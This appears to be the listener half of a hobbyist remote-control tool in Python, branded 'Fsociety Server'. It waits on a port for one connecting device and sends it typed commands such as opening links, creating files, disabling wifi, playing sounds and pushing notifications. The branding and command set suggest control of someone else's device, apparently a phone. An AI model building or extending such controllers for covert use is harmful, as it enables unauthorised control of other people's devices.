
import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", type=int, default=8080, help="Dinlenecek port")
args = parser.parse_args()
ip = "0.0.0.0"
port = args.port

s = socket.socket()
s.bind((ip, port))
s.listen(1)

print(f"[+] Dinleniyor: {ip}:{port}")
client, addr = s.accept()
print(f"[+] Bağlandı: {addr}")

def menu():
    print(f"""\n╔═══ Fsociety Server PORT {port} ═══╗
║ Komutları yaz ve gönder         ║
║ Örnek: youtube https://...      ║
║        olustur-dosya 50         ║
║        wifi-off                 ║
║        sound local              ║
║        bildirim "Başlık" "İçerik" ║
║        bildirim-say             ║
║        exit                     ║
╚═════════════════════════════════╝""")

menu()

while True:
    komut = input("Komut >> ").strip()
    if not komut:
        continue
    client.send(komut.encode())
    if komut == "exit":
        print("[!] Çıkış yapıldı.")
        break
    veri = client.recv(4096).decode()
    print(f"[📤 Cevap]:\n{veri}")

client.close()
